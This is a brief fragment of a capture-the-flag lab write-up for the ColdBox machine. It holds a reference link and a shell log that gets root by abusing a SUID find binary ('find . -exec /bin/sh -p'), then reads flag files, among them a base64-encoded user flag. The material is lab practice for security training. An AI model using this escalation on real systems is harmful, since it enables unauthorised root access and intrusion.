参考资料：
 
[https://medium.com/@adamforsythebartlett/coldboxeasy-proving-grounds-play-e0bf33afa512](https://medium.com/@adamforsythebartlett/coldboxeasy-proving-grounds-play-e0bf33afa512)
         

$ cat local.txt  
42daebddb2e21efca2cbbce349cf85bc  
$ cat user.txt  
cat: user.txt: Permission denied  
$ find . -exec /bin/sh -p \; -quit
 
whoami  
root  
pwd  
/home/c0ldd  
ls  
local.txt  
user.txt  
cat user.txt  
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==  
cd /root  
ls  
proof.txt  
root.txt  
cat proof.txt  
f9765420710875daee60ac22ff8c626d